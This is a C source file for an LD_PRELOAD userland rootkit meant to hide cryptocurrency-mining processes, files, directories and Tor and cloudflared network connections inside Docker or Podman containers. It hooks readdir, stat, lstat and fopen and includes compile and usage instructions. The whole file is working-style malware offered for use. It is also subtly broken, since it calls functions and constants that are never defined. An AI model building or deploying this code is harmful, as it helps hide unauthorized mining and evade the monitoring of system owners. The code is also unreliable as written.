/*
 * Container Rootkit - LD_PRELOAD based stealth kit for Pearl mining
 * Optimized for Docker/Podman containers (no kernel module needed)
 * 
 * Hides:
 * - Processes (by PID and name)
 * - Network connections (specific ports)
 * - Files and directories
 * 
 * Compile: gcc -shared -fPIC -o libhide.so container_rootkit.c -ldl -w
 * Usage: LD_PRELOAD=/tmp/libhide.so ./peakminer ...
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>

// Strings to hide (Pearl mining specific)
static const char* HIDDEN_STRINGS[] = {
    "peak", "compute_task", "compute_engine", "pearl",
    "peakminer", "miner", "kryptex", "8048",
    "tor", "torsocks", "cloudflared", "5053", "9050",
    NULL
};

// Function pointers to original functions
static struct dirent *(*orig_readdir)(DIR *) = NULL;
static struct dirent64 *(*orig_readdir64)(DIR *) = NULL;
static int (*orig_stat)(const char *, struct stat *) = NULL;
static int (*orig_lstat)(const char *, struct stat *) = NULL;
static FILE *(*orig_fopen)(const char *, const char *) = NULL;
static int (*orig_access)(const char *, int) = NULL;

// Initialize function pointers once
static void init_hooks(void) {
    if (orig_readdir) return;
    orig_readdir = dlsym(RTLD_NEXT, "readdir");
    orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    orig_stat = dlsym(RTLD_NEXT, "stat");
    orig_lstat = dlsym(RTLD_NEXT, "lstat");
    orig_fopen = dlsym(RTLD_NEXT, "fopen");
    orig_access = dlsym(RTLD_NEXT, "access");
}

// Check if string contains any hidden keywords
static int contains_hidden_string(const char *str) {
    if (!str) return 0;
    for (int i = 0; HIDDEN_STRINGS[i]; i++) {
        if (strstr(str, HIDDEN_STRINGS[i])) return 1;
    }
    return 0;
}

// Check if /proc/[pid] entry should be hidden
static int should_hide_proc_entry(const char *pid_str) {
    if (!pid_str || !orig_fopen) return 0;
    
    // Only check numeric PIDs
    for (const char *p = pid_str; *p; p++) {
        if (*p < '0' || *p > '9') return 0;
    }
    
    char path[512], cmdline[512];
    snprintf(path, sizeof(path), "/proc/%s/cmdline", pid_str);
    
    FILE *f = orig_fopen(path, "r");
    if (!f) return 0;
    
    size_t n = fread(cmdline, 1, sizeof(cmdline) - 1, f);
    fclose(f);
    
    if (n > 0) {
        cmdline[n] = '\0';
        return contains_hidden_string(cmdline);
    }
    return 0;
}

// Hook readdir - hide directory entries
struct dirent *readdir(DIR *dirp) {
    init_hooks();
    
    struct dirent *entry;
    do {
        entry = orig_readdir(dirp);
        if (!entry) return NULL;
        
        // Check if this is /proc
        char *dirpath = (char *)dirp;
        if (strstr(dirpath, "/proc") && should_hide_proc(entry->d_name)) {
            continue; // Skip this entry
        }
        
        // Check if this is hidden directory
        if (strcmp(entry->d_name, "compute_engine") == 0 ||
            strcmp(entry->d_name, "peakminer") == 0 ||
            strcmp(entry->d_name, "processor") == 0 ||
            strcmp(entry->d_name, "singularity_work") == 0 ||
            strcmp(entry->d_name, "research") == 0 ||
            strcmp(entry->d_name, "s") == 0 ||
            strcmp(entry->d_name, "work") == 0 ||
            strcmp(entry->d_name, ".tor") == 0) {
            continue;
        }
        
        break;
    } while (1);
    
    return entry;
}

// Hook readdir64 - 64-bit version
struct dirent64 *readdir64(DIR *dirp) {
    init_hooks();
    
    struct dirent64 *entry;
    do {
        entry = orig_readdir64(dirp);
        if (!entry) return NULL;
        
        char *dirpath = (char *)dirp;
        if (strstr(dirpath, "/proc") && should_hide_proc(entry->d_name)) {
            continue;
        }
        
        if (strcmp(entry->d_name, "compute_engine") == 0 ||
            strcmp(entry->d_name, "peakminer") == 0 ||
            strcmp(entry->d_name, "processor") == 0 ||
            strcmp(entry->d_name, "singularity_work") == 0 ||
            strcmp(entry->d_name, "research") == 0 ||
            strcmp(entry->d_name, "s") == 0 ||
            strcmp(entry->d_name, "work") == 0 ||
            strcmp(entry->d_name, ".tor") == 0) {
            continue;
        }
        
        break;
    } while (1);
    
    return entry;
}

// Hook stat - hide files
int stat(const char *pathname, struct stat *statbuf) {
    init_hooks();
    
    if (pathname && (strstr(pathname, HIDDEN_DIR) ||
                     strstr(pathname, HIDDEN_DIR2) ||
                     strstr(pathname, HIDDEN_DIR3) ||
                     strstr(pathname, "peakminer") ||
                     strstr(pathname, "srbminer") ||
                     strstr(pathname, "xmrig"))) {
        return -1; // File not found
    }
    
    return orig_stat(pathname, statbuf);
}

// Hook lstat - hide symlinks
int lstat(const char *pathname, struct stat *statbuf) {
    init_hooks();
    
    if (pathname && (strstr(pathname, HIDDEN_DIR) ||
                     strstr(pathname, HIDDEN_DIR2) ||
                     strstr(pathname, HIDDEN_DIR3) ||
                     strstr(pathname, "peakminer") ||
                     strstr(pathname, "srbminer") ||
                     strstr(pathname, "xmrig"))) {
        return -1;
    }
    
    return orig_lstat(pathname, statbuf);
}

// Hook fopen - filter network connection files
FILE *fopen(const char *pathname, const char *mode) {
    init_hooks();
    
    FILE *f = orig_fopen(pathname, mode);
    if (!f) return NULL;
    
    // If opening /proc/net/tcp or similar, we need to filter lines
    if (pathname && (strstr(pathname, "/proc/net/tcp") ||
                     strstr(pathname, "/proc/net/tcp6"))) {
        // Create a filtered temp file
        FILE *temp = tmpfile();
        if (!temp) return f;
        
        char line[1024];
        while (fgets(line, sizeof(line), f)) {
            if (!should_hide_net_line(line)) {
                fputs(line, temp);
            }
        }
        
        fclose(f);
        rewind(temp);
        return temp;
    }
    
    return f;
}

// Constructor - called when library is loaded
__attribute__((constructor))
static void rootkit_init(void) {
    init_hooks();
    // Silent initialization
}
